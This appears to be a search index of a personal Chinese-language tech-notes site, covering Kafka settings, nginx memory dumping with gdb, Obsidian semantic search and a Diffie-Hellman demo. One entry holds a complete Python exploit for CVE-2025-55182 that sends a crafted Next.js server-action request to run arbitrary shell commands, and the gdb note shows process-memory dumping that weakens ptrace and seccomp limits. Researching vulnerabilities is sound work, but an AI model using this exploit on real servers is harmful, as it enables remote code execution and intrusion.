[
{
		"title": "CVE-2025-55182 漏洞研究",
		"date":"Wed Dec 17 2025 15:02:21 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/CVE-2025-55182 漏洞研究/",
		"content": "npm create next-app@16.0.6\n\ncd my-app/\nnpm run dev\n\n打開 http://localhost:3000\n攻擊程式\n# refrence: https://github.com/msanft/CVE-2025-55182\n\nimport requests\nimport sys\nimport json\n\nBASE_URL = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;http://localhost:3000&quot;\nEXECUTABLE = sys.argv[2] if len(sys.argv) &gt; 2 else &quot;id&quot;\n\ncrafted_chunk = {\n&quot;then&quot;: &quot;$1:__proto__:then&quot;,\n&quot;status&quot;: &quot;resolved_model&quot;,\n&quot;reason&quot;: -1,\n&quot;value&quot;: '{&quot;then&quot;: &quot;$B0&quot;}',\n&quot;_response&quot;: {\n&quot;_prefix&quot;: f&quot;var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});&quot;,\n# If you don't need the command output, you can use this line instead:\n# &quot;_prefix&quot;: f&quot;process.mainModule.require('child_process').execSync('{EXECUTABLE}');&quot;,\n&quot;_formData&quot;: {\n&quot;get&quot;: &quot;$1:constructor:constructor&quot;,\n},\n},\n}\n\nfiles = {\n&quot;0&quot;: (None, json.dumps(crafted_chunk)),\n&quot;1&quot;: (None, '&quot;$@0&quot;'),\n}\n\nheaders = {&quot;Next-Action&quot;: &quot;x&quot;}\nres = requests.post(BASE_URL, files=files, headers=headers, timeout=10)\nprint(res.status_code)\nprint(res.text)",
		"tags": [ "note","CVE"]
},

{
		"title": "Consumer offset reset 行為",
		"date":"Wed Dec 17 2025 15:02:21 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Consumer offset reset 行為/",
		"content": "情境\n\nconsumer 預期會從 kafka 持續讀取 log，但如果 consumer crash，kafka 會保存 commited offset 7 天\n也說明，若 consumer 停機超過 7 天，之前消費的位置將會被重置\n參數\n\nauto.offset.reset=latest: 會從 kafka topic 最末端讀取 log\nauto.offset.reset=earliest: 從最早的地方開始讀 log\nauto.offset.reset=none: 若沒有 offset 資訊，將會拋出 exception\n\n重播 log 給 consumer\n\n步驟如下:\n\n關閉該 consumer group 底下所有的 consumer\n使用 kafka-consumer-groups 重置你想重置的 offset 位置\n重啟 consumer\n\nJava code\n透過 addShutdownHook 偵測 shutdown event\n...\n// get a reference\nfinal Thread mainThread = Thread.currentThread();\n\nRuntime.getRuntime().addShutdownHook(new Thread(){\npublic void run(){\nlog.info(&quot;Detected a shutdown event&quot;);\nconsumer.wakeup();\n\ntry {\nmainThread.join();\n} catch (InterruptedException e) {\ne.printStackTrace();\n}\n}\n});\n...\ntry(openSearchClient; consumer){\nboolean indexExists = openSearchClient.indices().exists(new GetIndexRequest(indexName), RequestOptions.DEFAULT);\nif (!indexExists){\n// we need to create the index on opensearch if it doesn't exist already\nCreateIndexRequest createIndexRequest = new CreateIndexRequest(indexName);\nopenSearchClient.indices().create(createIndexRequest, RequestOptions.DEFAULT);\nlog.info(&quot;The wikimedia index has been created&quot;);\n} else {\nlog.info(&quot;The wikimedia index already exists&quot;);\n}\n\nwhile (true){\nConsumerRecords&lt;String, String&gt; records = consumer.poll(Duration.ofMillis(3000));\n\nint recordCount = records.count();\nlog.info(&quot;Received &quot; + recordCount + &quot; record(s)&quot;);\nBulkRequest bulkRequest = new BulkRequest();\nfor (ConsumerRecord&lt;String, String&gt; record : records){\ntry{\nString id = extractId(record.value());\n// send the record into opensearch\nIndexRequest indexRequest = new IndexRequest(indexName)\n.source(record.value(), XContentType.JSON)\n.id(id);\n//IndexResponse indexResponse = openSearchClient.index(indexRequest, RequestOptions.DEFAULT);\nbulkRequest.add(indexRequest);\n} catch (Exception e){\n\n}\n}\nif (bulkRequest.numberOfActions() &gt; 0){\nBulkResponse bulkResponse = openSearchClient.bulk(bulkRequest, RequestOptions.DEFAULT);\nlog.info(&quot;Inserted &quot; + bulkResponse.getItems().length + &quot; record(s).&quot;);\ntry {\nThread.sleep(1000);\n} catch (InterruptedException e) {\ne.printStackTrace();\n}\n\n}\n\nconsumer.commitAsync();\nlog.info(&quot;offset have been committed!&quot;);\n}\n} catch (WakeupException e){\nlog.info(&quot;Consumer is starting to shutdown&quot;);\n} catch (Exception e){\nlog.error(&quot;unexpected exception: &quot;, e);\n} finally {\nconsumer.close(); // close the consumer, this will also commit offest to kafka.\nopenSearchClient.close();\nlog.info(&quot;The consumer is now gracefully shut down&quot;);\n}",
		"tags": [ "note","kafka","java"]
},

{
		"title": "kafka 高效率傳輸設定",
		"date":"Wed Dec 17 2025 15:02:21 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/kafka 高效率傳輸設定/",
		"content": "訂閱 kafka 消息\nkafka-console-consumer --bootstrap-server 127.0.0.1:19092 --topic wikimedia.recentchange\n\n高效率傳輸時，可考慮以下設定\n\nmax.in.flight.requests.per.connection\n\n每個 producer 在 broker 回覆 ack 前，最多送幾筆訊息出去\n若設定 = 1\n\n訊息只會一筆一筆發，會降低效率，但好處是，若訊息需要嚴格的排序(有新增 sort key)，那很重要\n\nlinger.ms\n\n等待一段 linger.ms，在此期間收到的消息都放在自己的暫存區，若 broker 批處理(batch.size)在 linger.ms 到達之前填滿，則立即批處理暫存區內的訊息，否則達到 linger.ms 才進行批處理\n\ncompression.type\n\n批處理參數，用於 broker 端壓縮訊息使用的算法(e.g. lz4、zstd、gzip...etc)\n\nbatch.size\n\n批處理的單筆 message 大小，若超過，則立即處理該訊息",
		"tags": [ "note","kafka"]
},

{
		"title": "使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學",
		"date":"Wed Dec 17 2025 15:02:21 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學/",
		"content": "主旨\n本教學示範如何透過 Linux 的 pmap、/proc/&lt;pid&gt;/smaps 與 gdb 取得指定 process 的匿名記憶體區段，並導出成 dump 檔供後續分析。\n\n0. 找出 nginx process\n\n1. 找出記憶體佔用最高的區段\n首先使用 pmap 檢查 Nginx worker 的 memory map，並依 RSS 由大到小排序：\n$ pmap -x 135 | sort -k 3 -n -r | head -3\ntotal kB 2709340 412896 407496\n00007fe347600000 468992 393644 393644 rw--- [ anon ]\n00007fe3423ee000 5632 3860 3860 rw--- [ anon ]\n\n重點：\n\nRSS 欄位表示實際佔用的實體記憶體。\n第一筆最大者：00007fe347600000，RSS 約 393MB。\n標記為 [ anon ]，通常代表匿名 mmap 或 GC heap、buffer、cache 等。\n\n2. 用 smaps 確認該地址區段的完整範圍\npmap 顯示的是區段起始地址，但實際區段長度需從 smaps 查詢。\n$ cat /proc/135/smaps | grep 7fe347600000\n7fe34296e000-7fe347600000 r--s 00000000 00:36 2640400 /data/nginx/ip2proxy/PX2_CUSTOMER.mmdb\n7fe347600000-7fe364000000 rw-p 00000000 00:00 0\n\n解讀：\n\n第一段：7fe34296e000-7fe347600000 是 memory-mapped file (PX2_CUSTOMER.mmdb)\n第二段：7fe347600000-7fe364000000 是匿名記憶體 (rw-p ... 0)\n這就是 pmap 顯示為 [ anon ] 的那一段。\n\n因此要 dump 的實際區段範圍為：\nstart: 0x7fe347600000\nend: 0x7fe364000000\n\n3. 使用 gdb attach 進程\n進入 gdb：\n$ gdb -pid 135\n若出現權限問題，需確認：\n\n容器需加上 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined\n\n或需在宿主機設置 kernel.yama.ptrace_scope=0\n\n4. 在 gdb 裡 dump 出記憶體檔案\n進入 gdb 之後，執行：\n(gdb) dump memory /tmp/memdump_1 0x7fe347600000 0x7fe364000000\n說明：\n\n/tmp/memdump_1 為輸出檔案路徑\n\n開始地址與結束地址對應 smaps 的匿名記憶體範圍\n\n假如 dump 成功，會在 /tmp 看到數百 MB 至數 GB 的檔案。\n\n5. 後續分析 dump 檔案\n\n讀取可見字串：\n\n$ strings /tmp/memdump_1 | less",
		"tags": [ "note","nginx","linux","gdb"]
},

{
		"title": "安裝 Obsidian 語意搜尋套件",
		"date":"Wed Dec 17 2025 15:02:21 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/安裝 Obsidian 語意搜尋套件/",
		"content": "Plugin repo: https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo\n在 Settings -&gt; Community plugins -&gt; Browse\n\n搜尋 Semantic Search\n\n安裝套件\n\n啟用 Semantic 套件\n\n安裝 ollama\nhttps://ollama.com/download\n下載 embeding model\nollama pull nomic-embed-text\n\n檢查 model 是否有安裝成功\n$ ollama list\nNAME ID SIZE MODIFIED\nnomic-embed-text:latest 0a109f422b47 274 MB About an hour ago\n\n參數名稱\n設定值\n\nAPI URL\nhttp://localhost:11434/api/embed\n\nModel\nnomic-embed-text\n\n設定參數\n\n打開 command palette\n\n按照以下順序執行\n\n之後就可以用這個進行語意搜尋\n\n整體語意搜尋結果還不錯\n\n總結\n透過這個 obsidian 工具，可以做到語意級別的模糊搜尋，有時候可能就是模糊的感覺，沒有明確的關鍵字，就可以考慮用這個搜尋工具進行搜尋。",
		"tags": [ "note","obsidian"]
},

{
		"title": "密碼學 - 零知識證明 - 密鑰協商",
		"date":"Wed Dec 17 2025 15:02:21 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/密碼學 - 零知識證明 - 密鑰協商/",
		"content": "範例程式(Diffie-Hellman 方法)\n讓我們用密碼學最常用的人名 Bob 與 Alice 舉例\nBob 端\nimport random\n# Diffie-Hellman\np = 23 # 公開參數\ng = 5 # 公開參數\n\nbob_private = random.randint(1, p-1)\nbob_public = (g ** bob_private) % p # 2\nprint(&quot;Bob 的公開值：&quot;, bob_public)\n\nalice_public = int(input(&quot;請輸入 Alice 的公開值: &quot;))\nbob_shared = (alice_public ** bob_private) % p\nprint(&quot;Bob 計算的共享密鑰：&quot;, bob_shared)\n\nAlice 端\nimport random\np = 23 # 公開參數\ng = 5 # 公開參數\n\nalice_private = random.randint(1, p-1)\nalice_public = (g ** alice_private) % p # 8\nprint(&quot;Alice 的公開值：&quot;, alice_public)\n\nbob_public = int(input(&quot;請輸入 Bob 的公開值: &quot;))\nalice_shared = (bob_public ** alice_private) % p\nprint(&quot;Alice 計算的共享密鑰：&quot;, alice_shared)\n\n只要輸入對方的公開數，就能計算出共享密鑰\n\n重放攻擊\n# Eve 已知 g, p, alice_public\np = 23 # 公開參數\ng = 5 # 公開參數\nalice_public = 12\n\n# Eve 嘗試所有可能的私鑰\nfor possible_private in range(1, p):\nif (g ** possible_private) % p == alice_public:\nprint(&quot;Alice 的私鑰是：&quot;, possible_private)\nbreak\n\n離散對數問題\n在正常情況下，Eve（攻擊者）無法輕易算出 Alice 的私鑰，這正是 Diffie-Hellman 密鑰交換的安全基礎。\n原因如下：\nAlice 的公開值是：alice_public = (g ** alice_private) % p\nEve 想要知道 alice_private，必須解「離散對數問題」：已知 g、p、alice_public，求 alice_private\n這個問題在大質數下是非常困難的（目前沒有有效的演算法），所以只要 p 夠大，Alice 的私鑰就很安全\n但如果 p 很小（像教學範例 p=23），Eve 可以用暴力法：\n這種方法只適用於 p 很小的情況。\n實務上 p 至少要 2048 位元，這樣 Eve 幾乎不可能算出 Alice 的私鑰。\n總結：\np 小時，Eve 可以暴力破解 Alice 的私鑰\np 夠大時，Eve 幾乎不可能算出 Alice 的私鑰\n這就是 Diffie-Hellman 的安全基礎\n安全質數\n選用夠大的「安全質數」可以防止離散對數被暴力攻擊\nhttps://datatracker.ietf.org/doc/html/rfc3526#section-2",
		"tags": [ "note","技術研究","演算法"]
},

{
		"title": "技術筆記",
		"date":"Wed Dec 17 2025 15:02:21 GMT+0000 (Coordinated Universal Time)",
		"url":"/",
		"content": "just 技術筆記",
		"tags": [ "note","gardenEntry"]
}
]